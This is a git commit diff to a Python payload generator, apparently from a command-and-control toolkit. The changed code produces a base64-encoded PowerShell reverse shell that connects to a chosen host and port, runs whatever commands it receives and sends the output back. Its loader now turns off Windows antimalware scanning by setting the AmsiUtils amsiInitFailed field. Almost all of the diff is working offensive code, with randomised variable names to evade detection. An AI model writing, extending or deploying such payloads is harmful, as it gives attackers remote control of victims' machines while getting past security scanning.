1eadee649394194655731f73a92cbfe64dcb998b
Edward Wolfgang <wolf@MacBook-Pro.local>
2025-05-21 12:53:38 -0700

    handler update pt 2

--- tools/ps_builder.py
+++ tools/ps_builder.py
@@ -26,44 +26,33 @@ def amsi_bypass_block(var):
         f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({field},'NonPublic,Static')\n"
         f"${var['amsi_field']}.SetValue($null,$true)\n"
     )
-
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
-    var = {k: rand_name() for k in [
-        "amsi_type", "amsi_field", "tcpclient", "stream", "bytes", "i", "data", "sendback",
-        "sendback2", "sendbyte"
-    ]}
-    amsi_bypass = amsi_bypass_block(var)
-
-    # DO NOT obfuscate class/type names! This is what breaks object creation!
+    var = {k: rand_name() for k in ["tcpclient", "stream", "bytes", "i", "data", "sendback", "sendbyte"]}
+    
     core_shell = (
-        junk_code() +
-        f"{amsi_bypass}"
-        f"${var['tcpclient']} = New-Object System.Net.Sockets.TCPClient('{host}',{port})\n"
-        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
-        f"${var['bytes']} = 0..65535|%{{0}}\n"
-        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
-        f"    ${{var['data']}} = (New-Object System.Text.ASCIIEncoding).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
-        f"    ${{var['data']}} = ${{var['data']}}.Trim()\n"
-        f"    if (${{var['data']}}.Length -gt 0) {{\n"
-        f"        ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
-        f"        ${{var['sendback2']}} = ${{{var['sendback']}}} + 'PS ' + (pwd).Path + '> '\n"
-        f"        ${{var['sendbyte']}} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
-        f"        ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n"
-        f"        ${{{var['stream']}}}.Flush()\n"
+        f"${var['tcpclient']} = New-Object System.Net.Sockets.TCPClient('{host}',{port});\n"
+        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream();\n"
+        f"${var['bytes']} = 0..65535|%{{0}};\n"
+        f"while((${{var['i']}}=${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
+        f"    ${{var['data']}}=(New-Object System.Text.ASCIIEncoding).GetString(${{{var['bytes']}}},0,${{{var['i']}}}).Trim();\n"
+        f"    if(${{var['data']}} -ne ''){{\n"
+        f"        try{{ $out=(iex ${{var['data']}} 2>&1|Out-String) }}catch{{ $out=$_ }};\n"
+        f"        $out+='PS '+(pwd).Path+'> ';\n"
+        f"        ${{var['sendbyte']}}=[System.Text.Encoding]::ASCII.GetBytes($out);\n"
+        f"        ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length);\n"
+        f"        ${{{var['stream']}}}.Flush();\n"
         f"    }}\n"
         f"}}\n"
-        + junk_code()
     )
 
-    # Loader: base64 encode everything except the AMSI bypass block (executes in the clear)
     core_shell_bytes = core_shell.encode('utf-8')
     core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
     loader_var = rand_name()
     loader = (
-        f"${loader_var} = '{core_shell_b64}'\n"
-        f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})))\n"
+        f"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);\n"
+        f"${loader_var}='{core_shell_b64}';\n"
+        f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})));\n"
     )
-    ps = loader
 
     if write_file:
         folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
@@ -71,10 +60,10 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
         path = os.path.join(folder, filename)
         with open(path, 'w', encoding='utf-8') as f:
-            f.write(ps)
+            f.write(loader)
         return filename
     else:
-        return ps
+        return loader
 
 # Alias for your other code
 generate_polymorphic_ps = generate_obfuscated_ps
